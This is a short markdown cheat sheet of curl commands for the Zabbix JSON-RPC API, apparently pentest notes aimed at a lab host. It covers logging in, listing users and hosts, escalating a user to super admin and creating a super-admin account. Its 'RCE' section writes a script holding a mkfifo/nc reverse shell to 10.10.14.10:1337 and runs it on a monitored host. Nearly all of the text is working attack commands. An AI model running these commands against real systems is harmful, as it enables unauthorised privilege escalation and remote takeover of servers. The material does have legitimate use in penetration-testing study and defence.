---
title: "Zabbix"
date: 2024-7-8
tags: ["zabbix", "api", "monitoring"]
---

---
### Zabbix API

#### General

```bash
# Auth with cred
curl http://10.10.11.10/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.login", "id":1, "auth":null, "params":{"user": "user", "password": "password"}}'
```

```bash
# Get users
curl -s http://10.10.11.10/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.get", "id":1, "auth":"abcdefgh1234567890ijklmnopqrstuv", "params":{"output": "extend"}}' | jq .
```

```bash
# Get hosts
curl -s http://10.10.11.10/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"host.get", "id":1, "auth":"abcdefgh1234567890ijklmnopqrstuv", "params":{}}' | jq .
```

```bash
# Get user group info
curl -s http://10.10.11.10/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"usergroup.get", "id":1, "auth":"abcdefgh1234567890ijklmnopqrstuv", "params":{"userids": "1"}}' | jq '.'
```

```bash
# Update user group info (e.g. gui_access)
curl -s http://10.10.11.10/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"usergroup.update", "id":1, "auth":"abcdefgh1234567890ijklmnopqrstuv", "params":{"usrgrpid": "12", "gui_access": "0"}}' | jq -c '.'
```

```bash
# Update user (e.g. change user to super admin)
curl -s http://10.10.11.10/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.update", "id":1, "auth":"abcdefgh1234567890ijklmnopqrstuv", "params":{"userid": "2", "type": "3"}}' | jq -c '.'
```

```bash
# Create user (e.g. with role super admin)
curl -s http://10.10.11.10/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.create", "id":1, "auth":"abcdefgh1234567890ijklmnopqrstuv", "params":{"passwd": "password", "usrgrps": [{"usrgrpid": "7"}], "alias": "user", "type": "3"}}' | jq -c '.'
```

#### RCE

```bash
# Create script on container 0 (default 1)
curl -s http://10.10.11.10/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.create", "id":1, "auth":"abcdefgh1234567890ijklmnopqrstuv", "params":{"command": "id", "name": "test", "execute_on": 0}}' | jq .
```

```bash
# Update script
curl -s http://10.10.11.10/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.update", "id":1, "auth":"abcdefgh1234567890ijklmnopqrstuv", "params":{"scriptid": 4, "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 1337 >/tmp/f"}}' | jq -c .
```

```bash
# Execute script (e.g. scriptid 4)
curl -s http://10.10.11.10/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"abcdefgh1234567890ijklmnopqrstuv", "params":{"hostid": 10106, "scriptid": 4}}' | jq .
```

<br>